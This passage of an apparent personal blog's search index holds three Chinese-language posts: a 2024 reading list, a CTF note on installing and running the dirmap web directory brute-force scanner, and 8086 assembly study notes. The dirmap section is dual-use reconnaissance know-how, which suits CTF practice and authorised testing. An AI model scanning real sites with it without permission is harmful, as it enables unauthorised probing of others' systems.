<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024-计划书单</title>
    <url>/2024/01/23/2024-%E8%AE%A1%E5%88%92%E4%B9%A6%E5%8D%95/</url>
    <content><![CDATA[<h2 id="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"><a href="#预祝新的一年你会有更多的属于自己的时刻！❀❀❀" class="headerlink" title="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"></a>预祝新的一年你会有更多的属于自己的时刻！❀❀❀</h2><h3 id="《家山》-王跃文"><a href="#《家山》-王跃文" class="headerlink" title="《家山》-王跃文"></a>《家山》-王跃文</h3><ul>
<li><p><input disabled type="checkbox"> 
looking forward to </p>
</li>
<li><p><input disabled type="checkbox"> 
reading </p>
</li>
<li><p><input checked disabled type="checkbox"> 
over</p>
</li>
</ul>
<blockquote>
<p>每一个人心中都会有一座属于自己的家山。</p>
</blockquote>
<h3 id="《且听风吟》-村上春树"><a href="#《且听风吟》-村上春树" class="headerlink" title="《且听风吟》-村上春树"></a>《且听风吟》-村上春树</h3><ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input checked disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>这世间，中有一个人懂你，让你抿起嘴，想念时流下眼泪。那些曾以为走不出的日子，现在都回不去了。~</p>
</blockquote>
<h3 id="《1973年的弹子球》-村上春树"><a href="#《1973年的弹子球》-村上春树" class="headerlink" title="《1973年的弹子球》-村上春树"></a>《1973年的弹子球》-村上春树</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>长大，或许就是终有一天你会知道，有些事物，当它从我们的生命中遗落时，就已经无法寻回。</p>
</blockquote>
<h3 id="《寻羊冒险记》-村上春树"><a href="#《寻羊冒险记》-村上春树" class="headerlink" title="《寻羊冒险记》-村上春树"></a>《寻羊冒险记》-村上春树</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>我喜欢我的懦弱，痛苦和难堪也喜欢，喜欢夏天的光照，风的气息，蝉的鸣叫，我喜欢这些，喜欢的不得了。</p>
</blockquote>
<h3 id="《了不起的盖茨比》-译村上春树"><a href="#《了不起的盖茨比》-译村上春树" class="headerlink" title="《了不起的盖茨比》-译村上春树"></a>《了不起的盖茨比》-译村上春树</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>这个世界，并不是所有人，都拥有你的那些优势。</p>
</blockquote>
<h3 id="《蛤蟆先生看心理医生》"><a href="#《蛤蟆先生看心理医生》" class="headerlink" title="《蛤蟆先生看心理医生》"></a>《蛤蟆先生看心理医生》</h3><ul>
<li><input disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input checked disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>能帮助你的人，只有你自己的。请相信，你可以完成这一切的，你并不是自以为的那样弱小。</p>
</blockquote>
<h3 id="《The-Wind-in-the-Willows》《柳林风声》"><a href="#《The-Wind-in-the-Willows》《柳林风声》" class="headerlink" title="《The Wind in the Willows》《柳林风声》"></a>《The Wind in the Willows》《柳林风声》</h3><ul>
<li><input checked disabled type="checkbox"> looking forward to</li>
<li><input disabled type="checkbox"> reading</li>
<li><input disabled type="checkbox"> over</li>
</ul>
<blockquote>
<p>关于四个小动物之间的友情陪伴和共同冒险的人生故事，蛤蟆先生的原型。</p>
</blockquote>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>2024</tag>
        <tag>书单</tag>
        <tag>Love</tag>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>CtfWeb_TOOL</title>
    <url>/2024/07/08/CtfWeb-TOOL/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="扫描篇"><a href="#扫描篇" class="headerlink" title="扫描篇"></a>扫描篇</h2><h4 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h4><p><strong>(一)介绍</strong></p>
<p>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑</p>
<p><strong>(二)安装</strong></p>
<p>github中搜索dirmap</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/dirmap1.png" alt="dirmap1"></p>
<p>复制链接于linux 中使用git clone下载</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># git clone https://github.com/H4ckForJob/dirmap.git </span></span><br><span class="line">正克隆到 <span class="string">&#x27;dirmap&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 449, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (193/193), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (82/82), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 449 (delta 124), reused 131 (delta 111), pack-reused 256</span><br><span class="line">接收对象中: 100% (449/449), 1.86 MiB | 2.02 MiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (229/229), 完成.</span><br></pre></td></tr></table></figure></div>

<p>下载完成，使用cd 切换至安装目录</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cd dirmap   </span></span><br><span class="line">                                                                               </span><br><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">data         dirmap.py  lib      README_EN.md  requirement.txt</span><br><span class="line">dirmap.conf  doc        LICENSE  README.md     thirdlib</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>利用python3 使用dirmap.py</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># python3 dirmap.py</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/dirmap/dirmap.py&quot;</span>, line 14, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from gevent import monkey</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;gevent&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>发现需要安装依赖包，查看reqirement.txt</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># cat requirement.txt </span></span><br><span class="line">gevent</span><br><span class="line">requests</span><br><span class="line">progressbar2</span><br><span class="line">lxml     </span><br></pre></td></tr></table></figure></div>

<p>安装依赖包</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># pip3 install requests progressbar2 lxml gevent</span></span><br></pre></td></tr></table></figure></div>

<p>使用dirmap.py</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># python3 dirmap.py </span></span><br><span class="line"></span><br><span class="line">                     <span class="comment">#####  # #####  #    #   ##   #####</span></span><br><span class="line">                     <span class="comment">#    # # #    # ##  ##  #  #  #    #</span></span><br><span class="line">                     <span class="comment">#    # # #    # # ## # #    # #    #</span></span><br><span class="line">                     <span class="comment">#    # # #####  #    # ###### #####</span></span><br><span class="line">                     <span class="comment">#    # # #   #  #    # #    # #</span></span><br><span class="line">                     <span class="comment">#####  # #    # #    # #    # #   v1.0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>安装成功！</p>
<p>使用方法</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">usage: python3 dirmap.py -i https://target.com -lcf</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">Engine:</span><br><span class="line">  Engine config</span><br><span class="line"></span><br><span class="line">  -t THREAD_NUM, --thread THREAD_NUM</span><br><span class="line">                        num of threads, default 30</span><br><span class="line"></span><br><span class="line">Target:</span><br><span class="line">  Target config</span><br><span class="line"></span><br><span class="line">  -i TARGET             scan a target or network (e.g. [http://]target.com ,</span><br><span class="line">                        192.168.1.1[/24] , 192.168.1.1-192.168.1.100)</span><br><span class="line">  -iF FILE              load targets from targetFile (e.g. urls.txt)</span><br><span class="line"></span><br><span class="line">Bruter:</span><br><span class="line">  Bruter config</span><br><span class="line"></span><br><span class="line">  -lcf, --loadConfigFile</span><br><span class="line">                        Load the configuration through the configuration file</span><br><span class="line">  --debug               Print payloads and <span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/dirmap2.png" alt="dirmap2"></p>
<blockquote>
<p><strong>用法：python3 dirmap.py -i 目标网址 -lcf 载入配置文件</strong></p>
<p><strong>其他参数 ：</strong></p>
<p><strong>-h 帮助文档</strong></p>
<p><strong>-t 线程 默认30</strong></p>
<p><strong>-i 目标网址</strong></p>
<p><strong>-iF 目标网址文件</strong></p>
<p><strong>-lcf 载入暴力破解配置文件</strong></p>
<p><strong>–debug 打印攻击载荷并退出</strong></p>
</blockquote>
]]></content>
      <tags>
        <tag>TOOL</tag>
        <tag>CTF</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>Assembley_language</title>
    <url>/2024/06/09/Assembley-language/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h1 id="1-第一章基础知识"><a href="#1-第一章基础知识" class="headerlink" title="1.第一章基础知识"></a>1.第一章基础知识</h1><h2 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1.机器语言"></a>1.1.机器语言</h2><p>机器语言就是机器指令的集合，机器指令展开来讲就是一台机器可以正确执行的命令</p>
<h2 id="1-2-汇编语言的产生"><a href="#1-2-汇编语言的产生" class="headerlink" title="1.2.汇编语言的产生"></a>1.2.汇编语言的产生</h2><p>汇编指令和机器指令的差别在于指令的表示方法上，汇编指令是机器指令便于记忆的书写格式</p>
<blockquote>
<p>操作 ：寄存器BX内容送到AX中</p>
<p>机器指令：1000100111011000</p>
<p>汇编指令：mov ax，bx</p>
</blockquote>
<p>因为计算机只能读懂机器指令，需要使用编译器将汇编指令编译成机器指令</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/a1.png" alt="a1"></p>
<h2 id="1-3-存储器"><a href="#1-3-存储器" class="headerlink" title="1.3.存储器"></a>1.3.存储器</h2><p>就是我们平常所说的内存</p>
<h2 id="1-4-存储单元"><a href="#1-4-存储单元" class="headerlink" title="1.4.存储单元"></a>1.4.存储单元</h2><p>存储器会被划分若干个存储单元</p>
<h2 id="1-5-CPU对存储器的读写"><a href="#1-5-CPU对存储器的读写" class="headerlink" title="1.5.CPU对存储器的读写"></a>1.5.CPU对存储器的读写</h2><p>通过地址总线，数据总线，控制总线对存储芯片中的数据进行读写</p>
<h2 id="1-6-主板"><a href="#1-6-主板" class="headerlink" title="1.6.主板"></a>1.6.主板</h2><p>每一台PC中，都有一个主板，通过地址总线，数据总线，控制总线将核心器件和主要器件进行相连</p>
<h2 id="1-7-接口卡"><a href="#1-7-接口卡" class="headerlink" title="1.7.接口卡"></a>1.7.接口卡</h2><p>计算机系统中，所有可用程序控制其工作的设备，必须收到CPU控制，CPU对外部设备都不能直接控制，比如显示器，音响，打印机等，直接控制这些设备进行工作的是<code>插在扩展插槽上的接口卡</code>，扩展插槽通过总线和CPU相连，接口卡也通过总线和CPU进行相连。<strong>CPU通过总线向接口卡发送命令，接口卡根据CPU的命令控制外设进行工作</strong></p>
<h2 id="1-8-各类存储器芯片"><a href="#1-8-各类存储器芯片" class="headerlink" title="1.8.各类存储器芯片"></a>1.8.各类存储器芯片</h2><p>一个PC中装有多个存储器芯片，从读写属性中分为</p>
<ul>
<li>RAM（随机存储器）：必须带电存储，关机后存储的内容丢失<ul>
<li>第一种:存放CPU和绝大部分程序和数据，主随机存储器一般由两个位置上的RAM组成，装在主板上的RAM和装在扩展槽上的RAM</li>
<li>第二种：接口卡上的RAM：某些接口需要对大批量数据，数据数据进行暂时存储，在其上安装RAM，最典型的就是显卡上的RAM，称之为<strong>显存</strong>，将要写入的内容写入显存中，显示卡随时将显存的数据在显示器上输出</li>
</ul>
</li>
<li>ROM（只读存储器）：只能读取，不能写入，关机之后内容不丢失<ul>
<li>装有BIOS（Basic Input&#x2F;Output System，基本输入&#x2F;输出系统）的ROM，BIOS 是主板和各类接口卡（如显卡，网卡等）厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入和输出。例如：主板的ROM中存储的主板的BIOS（系统BIOS），显卡上存储着显卡的BIOS，网卡上安装网卡的BIOS</li>
</ul>
</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/a2.png" alt="a2"></p>
<h2 id="1-9-内存地址空间"><a href="#1-9-内存地址空间" class="headerlink" title="1.9.内存地址空间"></a>1.9.内存地址空间</h2><p>上述的那些存储器，在物理上是独立的器件，但是一些两点比较相同</p>
<ul>
<li>都和CPU总线进行相连</li>
<li>CPU对它进行读写时候都是通过控制线发出内存读写命令</li>
</ul>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1602839784794.png" alt="1602839784794"></p>
<p>在上图中，所有的物理存储器被看作一个有若干个存储单元组成的<code>逻辑存储器</code>，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间，CPU在在这段地址空间读写数据，实际上就是在相对应的物理存储器上读写数据</p>
<h2 id="1-10-总结"><a href="#1-10-总结" class="headerlink" title="1.10.总结"></a>1.10.总结</h2><blockquote>
<p><strong>总结：</strong></p>
<ol>
<li>汇编指令是机器指令的助记符，同机器指令一一对应</li>
<li>每一种CPU都有自己的汇编指令集</li>
<li>CPU可以直接使用的信息在存储器中存放</li>
<li>在存储器中指令和数据没有任何区别，都是二进制信息</li>
<li>存储单元从零开始顺序编号</li>
<li>一个存储单元可以存储8个bit，即8位二进制数</li>
<li>1Byte&#x3D;8bit 1KB&#x3D;1024B 1MB&#x3D;1024KB 1GB&#x3D;1024MB  <strong>类比：2^10 1KB 2^20 1MB 2^30 1GB</strong></li>
<li>每一个CPU芯片都有许多管脚，这些管脚和总线进行相连，也可以说，这些管脚引出总线。CPU引出3种总线的宽度标志这个CPU的不同方面的性能</li>
<li>地址总线宽度决定了CPU的寻址能力</li>
<li>数据总线的宽度决定了CPU和其它器件进行数据传送时的一次数据传送量</li>
<li>控制总线宽度决定了CPU对系统中器件的控制能力</li>
<li>内存地址空间：使用汇编语言编程时候，必须从CPU的角度考虑问题，对CPU来说，系统中的所有存储器中的存储单元都处于一个统一的逻辑存储器中，它的容量受CPU的寻址能力限制，这个逻辑CPU就是我们所说的内存地址空间</li>
</ol>
</blockquote>
<p><strong>习题：</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%B1%87%E7%BC%96%E6%A3%80%E6%B5%8B1.1.png" alt="汇编检测1.1"></p>
<p><u>（1）1个CPU的寻址能力为8KB，那么它的地址总线的宽度为 <strong>13</strong>位。</u></p>
<p>答：8 KB&#x3D;8*1024 Byte&#x3D;2^3^*2^10^&#x3D;2^13^ Byte 所以13位</p>
<p><u>（2）1KB的存储器有 <strong>1024</strong> 个存储单元，存储单元的编号从 <strong>0</strong> 到 <strong>1023</strong> 。</u></p>
<p>答：一个存储字长为8 bit，1 KB&#x3D;1024 Byte&#x3D;1024 * 8 bit 有1024 存储单元</p>
<p>（3）1KB的存储器可以存储 <u><strong>8192（2^13）</strong></u> 个bit， <u><strong>1024</strong></u>个Byte。</p>
<p>答：1 KB&#x3D;1024 Byte&#x3D;1024 * 8 bit </p>
<p>（4）1GB是 <u><strong>1073741824 （2^30）</strong></u> 个Byte、1MB是 <strong><u>1048576（2^20）</u></strong> 个Byte、1KB是 **<u>1024（2^10）</u>**个Byte。</p>
<p>（5）8080、8088、80296、80386的地址总线宽度分别为16根、20根、24根、32根，则它们的寻址能力分别为: <u><strong>64</strong> （KB）</u>、 <u><strong>1</strong> （MB）</u>、 <u><strong>16</strong> （MB）</u>、 <u><strong>4</strong> （GB）</u>。</p>
<p>答：16根：2^16&#x3D;2^10 * 2^6  2^10是1024就是1KB   然后乘2^6 &#x3D;64 就是64KB，后面一次类推 </p>
<p>（6）8080、8088、8086、80286、80386的数据总线宽度分别为8根、8根、16根、16根、32根。则它们一次可以传送的数据为: <u><strong>1</strong> （B）</u>、 <u><strong>1</strong> （B）</u>、 <u><strong>2</strong> （B）</u>、 <u><strong>2</strong> （B）</u>、 <u><strong>4</strong> （B）</u>。</p>
<p>答：8根就是8bit&#x3D;1B ，后面一次类推</p>
<p>（7）从内存中读取1024字节的数据，8086至少要读 <u><strong>512</strong></u> 次，80386至少要读 <u><strong>256</strong></u> 次。</p>
<p>答：8086 数据总线宽度为16 1024 * 8 &#x2F;16 &#x3D; 512  80386数据总线宽度为32 1024 * 8 &#x2F;32 &#x3D; 256</p>
<p>（8）在存储器中，数据和程序以 <u><strong>二进制</strong></u> 形式存放。</p>
<h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h1><blockquote>
<p>一个CPU由运算器，控制器，寄存器等器件构成，这些器件靠内部总线进行相连。简单的说CPU中：</p>
<ul>
<li>运算器进行信息处理</li>
<li>寄存器进行信息存储</li>
<li>控制器控制各种器件进行工作</li>
<li>内部总线连接各个器件，在他们之间进行各种数据的传送</li>
</ul>
<p>寄存器是CPU中程序员可以用指令读写的部件，程序员可以通过改变各种寄存器的内容实现对CPU的控制</p>
<p>8086CPU由14个寄存器：AX，BX，CX，DX，SI，DI，SP，BP，IP，CS，SS,DS,ES,PSW</p>
</blockquote>
<h2 id="2-1-通用寄存器"><a href="#2-1-通用寄存器" class="headerlink" title="2.1.通用寄存器"></a>2.1.通用寄存器</h2><blockquote>
<p>所有的寄存器都是16位，可以存放两个字节。AX，BX，CX，DX 这4个通用寄存器，每一个寄存器可以分为两个可独立使用的8位寄存器来使用</p>
<ul>
<li>AX 可以分为AH和AL，累加器；可以与DX组合成为EAX&lt;&#x3D;&gt;DX:AX</li>
<li>CX可以分为CH和CL，计数器</li>
<li>DX可以分为DH和DL，累加器扩展</li>
<li>BX可以分为BH和BL，基址;可以和CX组合成为EBX&lt;&#x3D;&gt;CX:BX</li>
<li>BP基指针</li>
<li>SI源变址</li>
<li>DI目的变址</li>
<li>SP堆栈指针</li>
</ul>
</blockquote>
<h2 id="2-2-物理地址"><a href="#2-2-物理地址" class="headerlink" title="2.2.物理地址"></a>2.2.物理地址</h2><blockquote>
<p>CPU访问内存单元，要给出内存单元的地址。没一个内存单元在这个空间中都有一个唯一的地址，我们将这个唯一的地址称之为<code>物理地址</code></p>
</blockquote>
<h2 id="2-3-8086CPU给出物理地址的方法"><a href="#2-3-8086CPU给出物理地址的方法" class="headerlink" title="2.3.8086CPU给出物理地址的方法"></a>2.3.8086CPU给出物理地址的方法</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1603261636487.png" alt="1603261636487"></p>
<ol>
<li>CPU中的相关部件提供两个16位地址，一个称之为段地址，一个称之为偏移地址</li>
<li>段地址和偏移地址通过内部总线送入一个称之为地址加法器的部件</li>
<li>地址加法器将两个16位地址合成一个20位的物理地址</li>
<li>地址加法器通过内部总线将20位物理地址送入到输入和输出控制电路</li>
<li>输入和输出控制电路将20 位物理地址送上地址总线</li>
<li>20位物理地址被地址总线传送到存储器</li>
</ol>
<p><strong>地址加法器采用：</strong></p>
<p><strong>物理地址&#x3D;段地址*16+偏移地址</strong>[这里的16是十进制]</p>
<p><strong>物理地址&#x3D;段地址*(10)H+偏移地址</strong>[这里的10是十六进制]</p>
<h2 id="2-4-段的概念"><a href="#2-4-段的概念" class="headerlink" title="2.4.段的概念"></a>2.4.段的概念</h2><p>在编程时可以根据需要，将若干地址连续的内存单元看作一个段。偏移地址位16位，16位地址的最大寻址能力位64KB，所以要给段的长度最大位64KB</p>
<h2 id="2-5-段寄存器"><a href="#2-5-段寄存器" class="headerlink" title="2.5.段寄存器"></a>2.5.段寄存器</h2><blockquote>
<p>段寄存器：CS、DS、SS、ES</p>
<p>CS:<strong>代码段寄存器</strong></p>
<p>DS:<strong>数据段寄存器</strong></p>
<p>ES:<strong>附加段寄存器</strong></p>
<p>SS:<strong>堆栈段寄存器</strong></p>
<p>IP：<strong>指令指针寄存器</strong></p>
</blockquote>
<h2 id="2-6-CS和IP"><a href="#2-6-CS和IP" class="headerlink" title="2.6.CS和IP"></a>2.6.CS和IP</h2><p>假设CS中的内容位M，IP中内容位N，8086CPU将从内存M✖16+N单元开始，读取一条指令并执行</p>
<blockquote>
<p><strong>CPU将CS：IP指向内存单元中的内容看作指令</strong></p>
</blockquote>
<h2 id="2-7-总结"><a href="#2-7-总结" class="headerlink" title="2.7.总结"></a>2.7.总结</h2><blockquote>
<ul>
<li>CS 存放指令的段地址，IP存放指令的偏移地址，任意时刻，CPU将CS:IP指向内容当作指令的执行</li>
<li>CPU工作的流程</li>
<li>从CS：IP指向内存单元读取指令，读取的指令进入指令的缓冲器</li>
<li>IP指向下一条指令</li>
<li>执行指令</li>
</ul>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1603262922153.png" alt="1603262922153"></p>
<h2 id="2-8-Debug"><a href="#2-8-Debug" class="headerlink" title="2.8.Debug"></a>2.8.Debug</h2><ul>
<li>R命令查看、改变CPU寄存器的内容</li>
<li>D命令查看内存中的内容</li>
<li>E命令改写内存中的内容</li>
<li>U命令将内存中的机器指令翻译成汇编指令</li>
<li>T命令执行一条机器指令s</li>
<li>A命令已汇编指令的格式在内存中写入一条机器指令</li>
</ul>
<blockquote>
<p>DEBUG调试命令中的标志表示</p>
<table>
<thead>
<tr>
<th align="center">标志</th>
<th align="left">名称</th>
<th align="left">标志为1</th>
<th align="left">标志为0</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">OF</td>
<td align="left">溢出标志(Overflow flag)</td>
<td align="left">OF&#x3D;1|是(OV)</td>
<td align="left">否(NV)</td>
<td>运算结果超出机器用补码所能表示的范围，则为溢出</td>
</tr>
<tr>
<td align="center">DF</td>
<td align="left">方向标志(Direction flag)</td>
<td align="left">DF&#x3D;1|递减(DN)</td>
<td align="left">递增(UP)</td>
<td>DF为串操作指定规定增减方向</td>
</tr>
<tr>
<td align="center">TF</td>
<td align="left">陷阱标志(Trap flag)</td>
<td align="left">TF&#x3D;1|产生中断</td>
<td align="left">未产生中断</td>
<td>TF供调试指令程序使用</td>
</tr>
<tr>
<td align="center">IF</td>
<td align="left">中断标志(Interrupt flag)</td>
<td align="left">IF&#x3D;1|允许(EI)</td>
<td align="left">关闭(DI)</td>
<td>可用开中断指令STI和关中断指令CLI设置IF的状态</td>
</tr>
<tr>
<td align="center">SF</td>
<td align="left">符号标志(Sign flag)</td>
<td align="left">SF&#x3D;1|负(NG)</td>
<td align="left">正(PL)</td>
<td>运算结果的正负</td>
</tr>
<tr>
<td align="center">ZF</td>
<td align="left">零标志(Zero flag)</td>
<td align="left">ZF&#x3D;1|是(ZR)</td>
<td align="left">否(NZ)</td>
<td>运算结果全为0则ZF置1，否则置0</td>
</tr>
<tr>
<td align="center">AF</td>
<td align="left">辅助进位标志(Auxiliary carry flag)</td>
<td align="left">AF&#x3D;1|有(AC)</td>
<td align="left">无(NA)</td>
<td>进行算数运算时，低半字节向高半字节产生进位(加法)或借位(减法)则AF&#x3D;1，否则为0</td>
</tr>
<tr>
<td align="center">PF</td>
<td align="left">奇偶标志(Parity flag)</td>
<td align="left">PF&#x3D;1|偶(PE)</td>
<td align="left">奇(PO)</td>
<td>操作结果中低八位中含1的个数的奇偶性，对应1的个数为偶数则PF&#x3D;1；</td>
</tr>
<tr>
<td align="center">CF</td>
<td align="left">进位标志(Carry flag)</td>
<td align="left">CF&#x3D;1|是(CY)</td>
<td align="left">否(NC)</td>
<td>算数运算时，最高位产生进位或借位，则CF&#x3D;1</td>
</tr>
</tbody></table>
</blockquote>
<h1 id="3-寄存器-内存访问"><a href="#3-寄存器-内存访问" class="headerlink" title="3.寄存器(内存访问)"></a>3.寄存器(内存访问)</h1><h2 id="3-1-内存中的字存储"><a href="#3-1-内存中的字存储" class="headerlink" title="3.1.内存中的字存储"></a>3.1.内存中的字存储</h2><p>CPU中用16位寄存器存储一个字，高8位存放高位字节，低8位存放低位字节。<strong>内存单元是字节单元，一个单元存放一个字节，一个字需要使用两个连续的内存单元进行存放</strong>，这个字的低位字节存放在低地址单元，高位字节存放在高地址单元。<strong>双字需要使用四个连续的内存单元进行存放</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1603853188787.png" alt="1603853188787"></p>
<p><strong>问题：</strong></p>
<ol>
<li>0地址单元存放的<u>字节型</u>数据是多少？<strong>20 H</strong></li>
<li>0地址单元存放的<u>字型</u>数据是多少？<strong>4E20 H</strong></li>
<li>2地址单元存放的<u>字节型</u>数据是多少？<strong>12 H</strong></li>
<li>2地址单元存放的<u>字型</u>数是多少？<strong>0012 H</strong></li>
<li>1地址单元存放的<u>字型</u>数据是多少？<strong>124E H</strong></li>
<li>0地址单元存放的<u>双字型</u>数据是多少？<strong>00124E20 H</strong></li>
</ol>
<h2 id="3-2-DS和-address"><a href="#3-2-DS和-address" class="headerlink" title="3.2.DS和[address]"></a>3.2.DS和[address]</h2><p><strong>CPU 要读写一个内存单元的时候，必须给出这个内存单元的地址。内存单元的地址由段地址和偏移地址组成。DS寄存器通常需要存放访问数据的段地址</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx</span><br><span class="line">mov al,[0]</span><br><span class="line"></span><br><span class="line">[0]:表示内存单元的偏移地址</span><br><span class="line">指令执行的时候，CPU自动取DS中的数据作为内存单元的段地址</span><br><span class="line">mov al,[0]：表示数据从1000:0 单元到al 的传送</span><br></pre></td></tr></table></figure></div>

<h2 id="3-3-字的传送"><a href="#3-3-字的传送" class="headerlink" title="3.3.字的传送"></a>3.3.字的传送</h2><p>CPU是16位结构，有16根数据线，可以一次性传送16位数据，就是一个字</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1603855203907.png" alt="1603855203907"></p>
<h2 id="3-4-数据段"><a href="#3-4-数据段" class="headerlink" title="3.4.数据段"></a>3.4.数据段</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1603855360712.png" alt="1603855360712"></p>
<p><strong>总结</strong></p>
<blockquote>
<ol>
<li>字在内存中存储，使用两个地址连续的内存单元存放，低位字节存放在低地址单元，高位字节存放在高地址单元</li>
<li>双字在内存中存储，使用四个地址连续的内存单元存放，即两个字型数据的存储单元</li>
<li>使用mov指令访问内存单元，可以在mov指令中只给出单元的偏移地址，此时段地址默认在DS寄存器中</li>
<li>[address]表示一个偏移地址位address的内存单元，例如[2]表示偏移地址为2的内存单元</li>
<li>在内存和寄存器之间传动数据的时候，高地址单元和高8位寄存器相对应，低地址单元和低8位寄存器相对应</li>
</ol>
</blockquote>
<h2 id="3-5-栈"><a href="#3-5-栈" class="headerlink" title="3.5.栈"></a>3.5.栈</h2><ol>
<li>入栈：就是将一个新的元素放到栈顶，栈顶指针减小；</li>
<li>出栈：就是从栈顶取出一个新的元素，栈顶指针增大；</li>
<li>栈顶的元素总是LIFO(Last In First Out)：“先进后出”；</li>
</ol>
<h2 id="3-6-CPU提供栈机制"><a href="#3-6-CPU提供栈机制" class="headerlink" title="3.6.CPU提供栈机制"></a>3.6.CPU提供栈机制</h2><p>基本命令就是PUSH和POP，push ax 表示将寄存器ax中的数据送入栈中，pop ax 表示从栈顶中取出数据送入到ax，CPU入栈和出栈操作都是以字为单位进行的。</p>
<p><strong>段寄存器SS和SP，栈顶的段地址存放在SS中，偏移地址存放在SP中，任意时刻SS:SP指向栈顶元素</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1603856276469.png" alt="1603856276469"></p>
<h2 id="3-7-栈顶超解问题"><a href="#3-7-栈顶超解问题" class="headerlink" title="3.7.栈顶超解问题"></a>3.7.栈顶超解问题</h2><p>CPU不会保证我们对栈的操作不会超界。CPU只知道栈顶(SS:SP)在何处,不知道安排的栈的空间由多大。所以编程的时候操心栈顶超界的问题。</p>
<h2 id="3-8-栈的总结"><a href="#3-8-栈的总结" class="headerlink" title="3.8.栈的总结"></a>3.8.栈的总结</h2><blockquote>
<ol>
<li>在ss,sp中存放栈顶的段地址和偏移地址：提供入栈和出栈的指令，他们根据SS:SP指示的地址，按照栈的方式访问内存单元</li>
